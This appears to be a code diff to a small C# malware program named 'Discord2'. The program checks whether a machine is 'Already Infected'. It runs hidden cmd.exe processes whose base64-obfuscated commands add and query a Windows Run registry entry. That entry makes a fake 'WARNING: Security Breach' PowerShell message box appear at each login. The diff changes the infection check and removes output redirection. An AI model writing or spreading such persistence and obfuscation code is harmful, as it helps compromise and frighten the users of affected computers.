@@ -14,7 +14,7 @@ namespace Discord2
 
         public static void Run()
         {
-            if(OpenRegKey("warning")!=0){
+            if(OpenRegKey("warning")==0){
                 Console.WriteLine("Already Infected!");
                 return;
             }
@@ -156,7 +156,6 @@ namespace Discord2
             ProcessStartInfo startInfo = new ProcessStartInfo();
             startInfo.WindowStyle = ProcessWindowStyle.Hidden;
             startInfo.FileName = "cmd.exe";
-            startInfo.RedirectStandardOutput = true;
             startInfo.Arguments = String.Format(FromBase64("L0MgUkVHIEFERCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiB3YXJuaW5nIC90IFJFR19TWiAvZCAiezB9Ig=="), String.Format("powershell -noprofile -command \\\"Add-Type -Assemblyname PresentationFramework; [System.Windows.Messagebox]::Show('{0}', 'WARNING: Security Breach', 'OK', 'Exclamation')\\\"", message));
             process.StartInfo = startInfo;
             process.Start();
@@ -173,7 +172,6 @@ namespace Discord2
             ProcessStartInfo startInfo = new ProcessStartInfo();
             startInfo.WindowStyle = ProcessWindowStyle.Hidden;
             startInfo.FileName = "cmd.exe";
-            startInfo.RedirectStandardOutput = true;
             startInfo.Arguments = String.Format(FromBase64("L0MgUkVHIFFVRVJZIEhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIC92IHswfQ=="), name);
             process.StartInfo = startInfo;
             process.Start();
